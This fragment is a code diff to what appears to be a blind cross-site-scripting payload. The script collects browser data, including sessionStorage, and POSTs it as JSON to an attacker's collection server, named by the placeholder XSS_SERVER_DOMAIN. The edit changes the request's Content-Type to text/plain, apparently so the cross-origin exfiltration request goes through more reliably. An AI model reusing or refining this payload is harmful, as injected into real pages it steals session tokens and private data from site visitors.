@@ -274,7 +274,7 @@ sessionStorage:ss
 var p=document.location.protocol==='http:'?'http:':'https:';
 var x=new XMLHttpRequest();
 x.open('POST',p+'//XSS_SERVER_DOMAIN/x/',true);
-x.setRequestHeader('Content-Type','application/json');
+ x.setRequestHeader('Content-Type','text/plain');
 x.send(JSON.stringify(d));
 })();`
 
